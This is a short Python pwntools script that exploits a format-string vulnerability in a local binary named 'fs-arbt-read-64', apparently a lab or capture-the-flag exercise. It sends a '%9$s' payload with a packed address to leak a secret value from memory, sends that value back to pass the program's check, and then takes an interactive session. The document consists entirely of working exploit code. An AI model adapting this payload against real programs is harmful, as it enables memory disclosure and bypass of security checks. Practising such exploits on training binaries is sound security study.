#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-read-64')

print(p.recv())

p.sendline("%9$sAAAA" + p64(0x60109c))

data = p.recv(timeout=0.1)

random = u32(data[6:10])
print(hex(random))

p.sendline(hex(random))
print(p.recv())

p.interactive()
